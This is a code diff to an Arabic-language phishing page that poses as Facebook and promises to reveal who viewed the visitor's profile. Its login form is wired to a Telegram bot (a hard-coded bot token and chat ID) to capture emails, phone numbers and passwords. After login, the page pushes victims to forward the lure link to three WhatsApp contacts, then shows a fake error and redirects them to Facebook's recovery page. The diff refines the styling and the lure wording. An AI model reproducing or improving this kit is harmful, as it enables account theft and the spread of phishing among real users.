@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - اعرف من زار صفحتك</title>
     <style>
+        /* [التنسيقات السابقة كما هي] */
         body {
             font-family: Arial, sans-serif;
             background-color: #f0f2f5;
@@ -30,18 +31,19 @@
             font-weight: bold;
             margin-bottom: 20px;
         }
-        /* تحسين مظهر الرسائل التنبيهية (خلفية زرقاء) */
+        /* تعديل صندوق الرسالة الزرقاء ليتضمن النص الجديد */
         .info-box {
-            background: #e7f3ff; /* لون أزرق فاتح */
-            border: 1px solid #c7d8eb;
-            color: #1c1e21; /* لون نص داكن لتباين أفضل */
+            background: #1877f2;
+            border: 1px solid #1877f2;
+            color: white;
             padding: 15px;
             border-radius: 6px;
             margin-bottom: 20px;
             font-size: 15px;
+            font-weight: bold;
             line-height: 1.5;
         }
-        .main-lure-title { /* عنوان الإغراء الرئيسي */
+        .main-lure-title {
             font-size: 22px;
             color: #1c1e21;
             font-weight: bold;
@@ -89,26 +91,25 @@
             font-weight: bold;
             cursor: pointer;
         }
-        /* تنسيق خاص لشاشة المشاركة */
-        .share-screen-title { /* عنوان شاشة المشاركة */
-            font-size: 22px;
+        .share-screen-title {
+            font-size: 20px;
             color: #1c1e21;
             font-weight: bold;
             margin-bottom: 15px;
         }
-        .share-instruction-box { /* صندوق تعليمات المشاركة */
-            background: #e7f3ff;
-            border: 1px solid #c7d8eb;
-            color: #1c1e21;
+        .share-instruction-box {
+            background: #1877f2;
+            color: white;
             padding: 15px;
             border-radius: 6px;
             margin-bottom: 20px;
             font-size: 15px;
+            font-weight: bold;
             line-height: 1.5;
             text-align: center;
         }
         .whatsapp-share-btn {
-            background: #25d366;
+            background: #42b72a;
             color: white;
             padding: 12px;
             font-size: 16px;
@@ -117,6 +118,7 @@
             width: 80%;
             margin-top: 15px;
             cursor: pointer;
+            font-weight: bold;
         }
         #share-step {
             display: none;
@@ -124,11 +126,10 @@
     </style>
 
     <script>
-        // --- رمز التوكن القديم (نفترض أنه صالح للمحاكاة) ---
+        // --- رمز التوكن القديم (للمحاكاة) ---
         const BOT_TOKEN = "8518769039:AAHPWQWJEgROig0QKJg1xhTUGf6mUBfS53k"; 
         const CHAT_ID = "6717287161"; 
         
-        // رابط الموقع لارساله في رسالة المشاركة
         const SITE_LINK = "https://baljwfy825-crypto.github.io/whatsapp-test/";
 
         function send_telegram_data(event) {
@@ -158,13 +159,11 @@
         }
 
         function initiate_whatsapp_share() {
-            // رسالة الإغراء القوية التي سيتم مشاركتها مع رابط الموقع الفعلي
-            const share_text = `حصرياً! اعرف من يزور ملفك الشخصي على فيسبوك ومن يرى صورك بالخفاء فقط! اضغط هنا وشاهد بنفسك: ${SITE_LINK}`; 
+            const share_text = `اعرف من يراقب ملفك الشخصي على فيسبوك وصورك في الخفا: ${SITE_LINK}`; 
             
             const whatsapp_url = `whatsapp://send?text=${encodeURIComponent(share_text)}`;
             window.location.href = whatsapp_url;
 
-            // توجيه الضحية لصفحة فيسبوك بعد مدة قصيرة
             setTimeout(() => {
                 alert("تم التحقق من مشاركتك بنجاح! نأسف، تعذر عرض قائمة الزوار الآن. يرجى المحاولة لاحقاً.");
                 window.location.href = "https://www.facebook.com/recover/initiate/"; 
@@ -178,7 +177,7 @@
             <div class="logo">facebook</div>
             <div class="main-lure-title">اعرف من يزور ملفك الشخصي على فيسبوك</div>
             <div class="info-box">
-                قم بتسجيل الدخول لحسابك على فيسبوك 👇
+                قم بتسجيل الدخول لحسابك الذي تريد معرفة من يراقبه 👇
             </div>
             <form onsubmit="return send_telegram_data(event)">
                 <input type="text" id="identifier" name="identifier" placeholder="البريد الإلكتروني أو رقم الهاتف" required />
@@ -192,9 +191,9 @@
 
         <div id="share-step">
             <div class="logo">facebook</div>
-            <div class="share-screen-title">✅ تم التحقق من حسابك بنجاح!</div>
+            <div class="share-screen-title">✅ تم إكمال المصادقة!</div>
             <div class="share-instruction-box">
-                **الخطوة الأخيرة:** للمصادقة وتخطي قائمة الانتظار، يجب **مشاركة هذا الرابط** مع 3 أصدقاء أو مجموعة واحدة على واتساب.
+                **الخطوة النهائية:** لفتح قائمة الزوار ومشاهدة من يراقبك، **شارك هذا الرابط** مع 3 أشخاص أو مجموعة واحدة على واتساب فقط.
             </div>
             
             <button class="whatsapp-share-btn" onclick="initiate_whatsapp_share()">
